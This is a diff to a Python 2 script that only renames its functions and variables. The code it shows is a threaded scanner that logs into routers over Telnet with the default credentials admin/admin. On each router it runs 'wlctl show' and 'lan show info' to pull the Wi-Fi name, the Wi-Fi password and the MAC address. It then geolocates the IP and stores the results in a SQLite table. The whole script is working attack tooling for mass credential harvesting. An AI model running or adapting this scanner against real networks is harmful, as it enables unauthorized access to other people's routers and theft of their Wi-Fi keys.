@@ -61,21 +61,21 @@ class Database:
         self.connection.close()
 
 
-def bThread(ip_list):
-    threadl = []
+def b_thread(ip_list):
+    thread_list = []
     queue = Queue.Queue()
     hosts = ip_list
     for host in hosts:
         queue.put(host)
     for x in xrange(0, SET_THREAD):
-        threadl.append(tThread(queue))
-    for t in threadl:
+        thread_list.append(tThread(queue))
+    for t in thread_list:
         try:
             t.daemon = True
             t.start()
         except:
             pass
-    for t in threadl:
+    for t in thread_list:
         t.join()
 
 
@@ -93,13 +93,12 @@ class tThread(Thread):
                 continue
 
 
-def getposition(host):
+def get_position_by_ip(host):
     try:
-        ipurl = "http://ip.taobao.com/service/getIpInfo.php?ip=" + host
+        ip_url = "http://ip.taobao.com/service/getIpInfo.php?ip=" + host
         header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"}
-        req = requests.get(url=ipurl, headers=header, timeout=5)
-        jsondata = json.loads(req.content.decode('utf8').encode('utf8'))['data']
-        info = [jsondata['country'], jsondata['region'], jsondata['city'], jsondata['isp']]
+        json_data = json.loads(requests.get(url=ip_url, headers=header, timeout=5).text)['data']
+        info = [json_data['country'], json_data['region'], json_data['city'], json_data['isp']]
         return info
     except Exception, e:
         print e
@@ -110,23 +109,23 @@ def getinfo(host):
 
     username = "admin"
     password = "admin"
-    telnetTime = 15
-    cmdTime = 5
+    telnet_timeout = 15
+    cmd_timeout = 5
 
     try:
-        t = Telnet(host, timeout=telnetTime)
+        t = Telnet(host, timeout=telnet_timeout)
 
-        t.read_until("username:", cmdTime)
+        t.read_until("username:", cmd_timeout)
         t.write(username + "\n")
-        t.read_until("password:", cmdTime)
+        t.read_until("password:", cmd_timeout)
         t.write(password + "\n")
 
         t.write("wlctl show\n")
-        t.read_until("SSID", cmdTime)
+        t.read_until("SSID", cmd_timeout)
         wifi_str = t.read_very_eager()
 
         t.write("lan show info\n")
-        t.read_until("MACAddress", cmdTime)
+        t.read_until("MACAddress", cmd_timeout)
         lan_str = t.read_very_eager()
 
         t.close()
@@ -140,7 +139,7 @@ def getinfo(host):
             wifi_key = wifi_str[wifi_str.find('Key=') + 4:wifi_str.find('cmd')] if wifi_str.find('Key=') != -1 else '无密码'
             router_mac = lan_str[1:lan_str.find('__')].replace('\r\n', '')
 
-            currentTime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
+            current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
 
             try:
                 query_info = "select * from scanlog where ssid=%s and key=%s"
@@ -148,18 +147,18 @@ def getinfo(host):
 
                 if len(query_result) < 1:
 
-                    posData = getposition(host)
-                    country = unicode(posData[0])
-                    province = unicode(posData[1])
-                    city = unicode(posData[2])
-                    isp = unicode(posData[3])
+                    position_data = get_position_by_ip(host)
+                    country = unicode(position_data[0])
+                    province = unicode(position_data[1])
+                    city = unicode(position_data[2])
+                    isp = unicode(position_data[3])
 
                     insert_info = """INSERT INTO scanlog (`host`,`mac`,`ssid`,`wifikey`,`country`,`province`,`city`,`isp`) VALUES (?,?,?,?,?,?,?,?)"""
 
                     my_sqlite_db.insert(insert_info, (host, router_mac, wifi_ssid, wifi_key, country, province, city, isp))
-                    print '[√] [%s] Info %s  %s  %s => Inserted!' % (currentTime, host, wifi_ssid, wifi_key)
+                    print '[√] [%s] Info %s  %s  %s => Inserted!' % (current_time, host, wifi_ssid, wifi_key)
                 else:
-                    print '[x] [%s] Found %s  %s  %s in DB, do nothing!' % (currentTime, host, wifi_ssid, wifi_key)
+                    print '[x] [%s] Found %s  %s  %s in DB, do nothing!' % (current_time, host, wifi_ssid, wifi_key)
             except Exception, e:
                 print e
     except:
@@ -184,7 +183,7 @@ if __name__ == '__main__':
     print '\n================ Running ================='
 
     try:
-        bThread(ip_list)
+        b_thread(ip_list)
     except KeyboardInterrupt:
         print '\n[*] Kill all thread.'
         os.kill(current_pid, 9)
